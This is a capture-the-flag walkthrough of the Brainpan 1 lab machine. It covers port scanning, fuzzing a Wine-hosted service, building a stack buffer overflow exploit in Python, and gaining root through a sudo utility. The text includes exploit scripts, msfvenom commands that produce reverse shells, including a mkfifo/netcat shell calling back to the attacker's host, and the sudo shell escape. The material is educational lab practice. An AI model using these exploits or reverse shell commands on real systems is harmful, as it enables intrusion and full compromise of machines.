# Brainpan 1 Walkthrough
Following is the outcome of my adventure with Brainpan: 1 
Without further delay, let's start the party.

## 1. Initial Scan

`nmap -sV -sT -v -p- -T4 192.168.56.1/24`

```
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
...
...
...
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.32
OS details: Linux 2.6.32
Uptime guess: 8.367 days (since Tue Feb 25 05:58:00 2020)
Network Distance: 0 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros
```

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/welcome-to-brainpan.png)

* custom application running in Wine on port 9999
* python SimpleHTTPServer on port 10000

**Nikto** might be helpful at this moment

`nikto -h 192.168.56.106`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/nikto-scan-output.png)

It tells us about the mysterious `bin` directory
Let's browse the website and look inside it

`192.168.56.106:10000/bin/`

A suspicious app binary is waiting there for us - maybe it's the key for solving this puzzle? 

We won't know unless we check it out. Let's run the `strings` command to view the hardcoded strings within the binary

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/strings-output.png)

The `shitstorm` line instantly draws the attention - it may be a password to a certain service!
We are gonna give it a try:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/192.168.56.106%209999.png)

It looks useless. I also used telnet but still nothing, the application responded with the following: Connection closed by foreign host.

The app behaves as if it were a kind of a server. After opening the socket it waits for connection, checks the input and then drops.

## 2. Some scripting & fuzzing 

Preinstalled Immunity Debugger on Windows 32-bit VM may come in handy here.

**In the first round** we're gonna send a long, repeated string of A's with a simple fuzzer visible below. By running the script, the terminal will tell us whether providing sufficiently long input can crash the app:

```
import socket

for i in range(30):
  s = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
  s.connect(("192.168.56.105",9999)) # mind to change the IP address :-)
  payload = int(i)*("A"*100)
  s.send(payload+"\r\n")
  print "[*] Sending buffer data with " + str(len(str(payload))) + " A's\r\n"
  s.close()
```

Running the code provides us with the following output:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/python-fuzzer-output.png)

Turns out that the overflow occurs around the length of 900 A's.

In Immunity we notice that the EIP has been overwritten with 41414141 (Hex representation of four A's). It also says that an *Access violation* occurs while executing the code at address 41414141.

## 3. Finding EIP location

As the vulnerability is known and it's obvious that we've gained control over replacing the EIP address, it brings us closer to our goal.

Firstly, we need to find the offset that could control the EIP. We're gonna utilize a Metasploit feature and create a pattern consisting of a set of unique, three-character substrings: 

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/pattern-create-ruby.png)

It spits out a unique and random set that perfectly fits to our payload.
```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = ("Put the pattern here")

print s.recv(1024)
s.send(payload)
print s.recv(1024)

s.close()
```
Execution of the script causes *Access violation* again and leads to crash:

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/overwriting-eip.png)

As you can see above, the pattern inside the EIP is **35724134**

After having the pattern located inside the instruction pointer (EIP), let's determine the offset (known as the exact location of the address) and make it point to our malicious shellcode, which we will craft later on.

`ruby pattern_offset.rb -q 35724134`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/pattern-offset-ruby.png)

Exactly 524 bytes of junk data is needed to get us to the EIP.

Now our payload will look like this: `"A"*524+"B"*4+"C"*(900-524-4)`

```
import socket

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.56.105',9999))

payload = "A"*524 + "B"*4 + "C"*(900-524-4)

print s.recv(1024)
s.send(payload+"\r\n")
print s.recv(1024)

s.close()
```
After executing this script the EIP gets overwritten with 42424242 (the HEX code of "B" is 0x42)

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/Access-violation-42424242.png)

Setting JMP ESP address

`!mona jmp -r ESP`

Quick glance and we see something helpful:

`0x31170000` <- module with no SafeSEH and ASLR protection

And we find the JMP ESP address

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/JMP-ESP-address.png)

## 4. Shellcode payload and reverse shell

* Brainpan's IP - 192.168.56.106
* Attacker's IP - 192.168.56.101
* Windows IP - 192.168.56.105

`msfvenom -p windows/shell_reverse_tcp lhost=192.168.56.101 lport=4444 -f c -b "\x00"`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/msfvenom-windows-shell-reverse-tcp.png)

```
import socket

buf = ("\xb8\xf9\...\...\...\..."
"\xc9\xb1\...\..\...\...\...\..."
"...
"...
...
"\x..\x..\x..\x..") 

payload = "A"*524 + "\xf3\x12\x17\x31" + "\x90"*16 + buf
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  s.connect(('192.168.56.106',9999))
except:
  print "Error"
  sys.exit(0)

s.recv(1024)
s.send(payload)
```


![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/nc-nlvp-4444.png)

It was really confusing at first. Notice the CMD 1.4.1 label? This is because the windows executable is running through Wine on a Linux machine. Time to switch to Linux shell.

`msfvenom -p linux/x86/exec CMD="mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.101 4444 >/tmp/f" -b "\x00" -f py`

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/msfvenom-linux-x86-exec-shell.png)

...and swap the shellcode in our python script after setting up the netcat once again.

## 5. Privilege escalation
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/netcat-and-python-shell.png)

Good, we're back in the game!
Spawning a tty shell -> check `id` -> list the directory `ls -la` -> `cat checksrv.sh` -> and check the local users

![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/further-enumeration-shell.png)
`cat group`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/cat-group.png)
`cat passwd` -> `ls` -> `cd /opt` -> `cd /etc`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/cat-passwd.png)
`ls -la sudoers`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/ls-la-sudoers.png)
`sudo /home/anansi/bin/anasi_util`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/sudo-home-anansi-bin-anansi-util.png)
`sudo /home/anansi/bin/anasi_util manual /etc/sudoers`
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/sudo-home-anansi-bin-anansi-util-etc-sudoers.png)
`!/bin/bash`
And finally!
![](https://raw.githubusercontent.com/d15rup7or/Labs/master/Brainpan%3A%201/img/root%40brainpan.png)

## Conclusion
It is a great opportunity to improve:
- understanding of buffer overflow
- scripting skills,
- fundamentals of Immunity Debugger,

Thank you for your attention :)
